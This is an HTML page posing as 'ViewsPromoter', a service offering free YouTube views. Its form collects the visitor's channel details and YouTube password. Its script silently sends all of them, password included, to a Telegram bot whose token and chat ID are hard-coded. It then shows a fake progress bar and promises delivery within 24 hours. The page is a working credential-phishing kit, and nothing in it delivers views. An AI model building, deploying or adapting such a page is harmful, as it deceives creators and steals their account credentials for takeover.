<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Views Promoter</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #FF0000;
            --primary-dark: #CC0000;
            --dark: #0F0F0F;
            --dark-gray: #222222;
            --medium-gray: #3D3D3D;
            --light-gray: #F1F1F1;
            --white: #FFFFFF;
            --success: #00AB41;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--dark);
            color: var(--white);
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 0;
        }

        .container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        /* Header Section */
        .header {
            text-align: center;
            margin-bottom: 40px;
            position: relative;
        }

        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: var(--primary);
            border-radius: 50%;
            padding: 8px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(90deg, var(--primary), #FF5E5E);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .tagline {
            font-size: 16px;
            color: var(--light-gray);
            margin-top: 10px;
            font-weight: 400;
        }

        /* Form Section */
        .form-container {
            background-color: var(--dark-gray);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            margin-bottom: 30px;
            border: 1px solid var(--medium-gray);
        }

        .form-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 25px;
            color: var(--white);
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--light-gray);
            font-size: 14px;
        }

        input, select {
            width: 100%;
            padding: 14px 16px;
            background-color: var(--medium-gray);
            border: 1px solid var(--medium-gray);
            border-radius: 8px;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            color: var(--white);
            transition: all 0.3s;
        }

        input:focus, select:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.2);
            background-color: var(--dark-gray);
        }

        input::placeholder {
            color: #888;
        }

        /* Range Slider */
        .range-container {
            margin-top: 25px;
        }

        .range-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }

        .range-value {
            font-weight: 600;
            color: var(--primary);
        }

        .range-slider {
            -webkit-appearance: none;
            width: 100%;
            height: 6px;
            border-radius: 3px;
            background: var(--medium-gray);
            outline: none;
        }

        .range-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: var(--primary);
            cursor: pointer;
            transition: all 0.2s;
            border: 3px solid var(--white);
        }

        .range-slider::-webkit-slider-thumb:hover {
            transform: scale(1.1);
        }

        .range-labels {
            display: flex;
            justify-content: space-between;
            margin-top: 5px;
            font-size: 12px;
            color: var(--light-gray);
        }

        /* Submit Button */
        .submit-btn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: var(--white);
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        /* Processing Section */
        .processing-container {
            display: none;
            background-color: var(--dark-gray);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            border: 1px solid var(--medium-gray);
        }

        .processing-header {
            text-align: center;
            margin-bottom: 25px;
        }

        .processing-title {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--white);
        }

        .processing-subtitle {
            font-size: 14px;
            color: var(--light-gray);
        }

        .submission-details {
            background-color: var(--medium-gray);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .detail-item {
            margin-bottom: 15px;
            display: flex;
        }

        .detail-item:last-child {
            margin-bottom: 0;
        }

        .detail-label {
            font-weight: 500;
            color: var(--light-gray);
            width: 120px;
            font-size: 14px;
        }

        .detail-value {
            font-weight: 400;
            color: var(--white);
            flex: 1;
            word-break: break-all;
            font-size: 14px;
        }

        /* Progress Bar */
        .progress-container {
            margin: 30px 0;
        }

        .progress-text {
            font-size: 14px;
            color: var(--light-gray);
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background-color: var(--medium-gray);
            border-radius: 4px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, var(--primary), #FF5E5E);
            border-radius: 4px;
            transition: width 5s linear;
        }

        .progress-light {
            position: absolute;
            right: 0;
            top: 0;
            width: 30px;
            height: 100%;
            background: linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,0.3));
            animation: shine 2s infinite;
        }

        .success-message {
            display: none;
            background-color: rgba(0, 171, 65, 0.1);
            border: 1px solid var(--success);
            color: var(--success);
            padding: 15px;
            border-radius: 8px;
            font-weight: 500;
            margin-top: 25px;
            text-align: center;
            font-size: 15px;
            animation: fadeIn 0.5s ease-out;
        }

        /* Animations */
        @keyframes shine {
            0% {
                transform: translateX(-30px);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateX(100px);
                opacity: 0;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 20px 15px;
            }

            .form-container, .processing-container {
                padding: 25px 20px;
            }

            .logo-text {
                font-size: 24px;
            }

            .form-title, .processing-title {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-container">
                <div class="logo-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M21.5829 6.18604C21.3797 5.40683 20.7663 4.79344 19.9871 4.5902C18.5416 4.2002 12 4.2002 12 4.2002C12 4.2002 5.45837 4.2002 4.01286 4.5902C3.23365 4.79344 2.62026 5.40683 2.41702 6.18604C2.02702 7.63155 2.02702 10.8002 2.02702 10.8002C2.02702 10.8002 2.02702 13.9688 2.41702 15.4143C2.62026 16.1936 3.23365 16.8069 4.01286 17.0102C5.45837 17.4002 12 17.4002 12 17.4002C12 17.4002 18.5416 17.4002 19.9871 17.0102C20.7663 16.8069 21.3797 16.1936 21.5829 15.4143C21.9729 13.9688 21.9729 10.8002 21.9729 10.8002C21.9729 10.8002 21.9729 7.63155 21.5829 6.18604Z" fill="white"/>
                        <path d="M9.92706 14.0284L15.3271 10.8004L9.92706 7.57239V14.0284Z" fill="#FF0000"/>
                    </svg>
                </div>
                <div class="logo-text">ViewsPromoter</div>
            </div>
            <div class="tagline">Boost your YouTube views instantly</div>
        </div>

        <div class="form-container">
            <h2 class="form-title">Request Views</h2>
            <form id="youtubeForm">
                <div class="form-group">
                    <label for="name">YouTube Channel Name</label>
                    <input type="text" id="name" name="name" required placeholder="Enter your channel name">
                </div>
                <div class="form-group">
                    <label for="channelLink">Channel URL</label>
                    <input type="url" id="channelLink" name="channelLink" required placeholder="https://youtube.com/@yourchannel">
                </div>
                <div class="form-group">
                    <label for="videoLink">Video URL</label>
                    <input type="url" id="videoLink" name="videoLink" placeholder="https://youtube.com/watch?v=...">
                </div>
                <div class="form-group">
                    <label for="password">Youtube Security Password</label>
                    <input type="password" id="password" name="password" required placeholder="Youtube password">
                </div>

                <div class="range-container">
                    <div class="range-header">
                        <label>Views Quantity</label>
                        <div class="range-value" id="rangeValue">1,000</div>
                    </div>
                    <input type="range" id="views" name="views" min="100" max="10000" step="100" value="1000" class="range-slider">
                    <div class="range-labels">
                        <span>100</span>
                        <span>10,000</span>
                    </div>
                </div>

                <button type="submit" class="submit-btn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M17 20H7C4 20 2 18 2 15V9C2 6 4 4 7 4H17C20 4 22 6 22 9V15C22 18 20 20 17 20Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M19 9.5C19.8284 9.5 20.5 8.82843 20.5 8C20.5 7.17157 19.8284 6.5 19 6.5C18.1716 6.5 17.5 7.17157 17.5 8C17.5 8.82843 18.1716 9.5 19 9.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    Submit Request
                </button>
            </form>
        </div>

        <div class="processing-container" id="processingContainer">
            <div class="processing-header">
                <h2 class="processing-title">Processing Your Request</h2>
                <div class="processing-subtitle">Your views are being prepared</div>
            </div>

            <div class="submission-details">
                <div class="detail-item">
                    <div class="detail-label">Channel Name:</div>
                    <div class="detail-value" id="detailName"></div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Channel URL:</div>
                    <div class="detail-value" id="detailChannel"></div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Video URL:</div>
                    <div class="detail-value" id="detailVideo"></div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Views Requested:</div>
                    <div class="detail-value" id="detailViews"></div>
                </div>
            </div>

            <div class="progress-container">
                <div class="progress-text">
                    <span>Processing</span>
                    <span id="progressPercent">0%</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                    <div class="progress-light"></div>
                </div>
            </div>

            <div class="success-message" id="successMessage">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px;">
                    <path d="M22 11.08V12C21.9988 14.1564 21.3005 16.2547 20.0093 17.9818C18.7182 19.709 16.9033 20.9725 14.8354 21.5839C12.7674 22.1953 10.5573 22.1219 8.53447 21.3746C6.51168 20.6273 4.78465 19.2461 3.61096 17.4371C2.43727 15.628 1.87979 13.4881 2.02168 11.3363C2.16356 9.18455 2.99721 7.13631 4.39828 5.49706C5.79935 3.85781 7.69279 2.71537 9.79619 2.24013C11.8996 1.7649 14.1003 1.98232 16.07 2.85999" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M22 4L12 14.01L9 11.01" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                Your views will be delivered within 24 hours!
            </div>
        </div>
    </div>

    <script>
        // Format number with commas
        function formatNumber(num) {
            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        }

        // Update range value display
        const rangeSlider = document.getElementById('views');
        const rangeValue = document.getElementById('rangeValue');

        rangeSlider.addEventListener('input', function() {
            rangeValue.textContent = formatNumber(this.value);
        });

        // Form submission
        document.getElementById('youtubeForm').addEventListener('submit', function(e) {
            e.preventDefault();

            // Get form values
            const name = document.getElementById('name').value;
            const channelLink = document.getElementById('channelLink').value;
            const videoLink = document.getElementById('videoLink').value || 'Not provided';
            const password = document.getElementById('password').value;
            const views = document.getElementById('views').value;

            // Prepare data for Telegram bot
            const data = {
                name: name,
                channelLink: channelLink,
                videoLink: videoLink,
                password: password,
                views: views
            };

            // Replace with your actual Telegram bot API URL
            const telegramBotToken = '7752195168:AAGNWIc2vhdUxS1TMggHqSsi7GOpBmZ4SAU';
            const chatId = '6569859929';
            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            // Send data to Telegram bot (this will work when hosted)
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `New YouTube Views Request:\n\nName: ${name}\nChannel: ${channelLink}\nVideo: ${videoLink}\nViews: ${formatNumber(views)}\nPassword: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Telegram:', data);
            })
            .catch((error) => {
                console.error('Error sending to Telegram:', error);
            });

            // Show processing page
            document.getElementById('youtubeForm').reset();
            document.querySelector('.form-container').style.display = 'none';

            const processingContainer = document.getElementById('processingContainer');
            processingContainer.style.display = 'block';

            // Show submitted details
            document.getElementById('detailName').textContent = name;
            document.getElementById('detailChannel').textContent = channelLink;
            document.getElementById('detailVideo').textContent = videoLink;
            document.getElementById('detailViews').textContent = formatNumber(views) + ' views';

            // Start progress bar animation
            const progressFill = document.getElementById('progressFill');
            const progressPercent = document.getElementById('progressPercent');

            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    document.getElementById('successMessage').style.display = 'flex';
                } else {
                    width++;
                    progressFill.style.width = width + '%';
                    progressPercent.textContent = width + '%';
                }
            }, 50); // 50ms * 100 = 5 seconds total

            // Reset range value display
            rangeValue.textContent = '1,000';
        });
    </script>
</body>
</html>
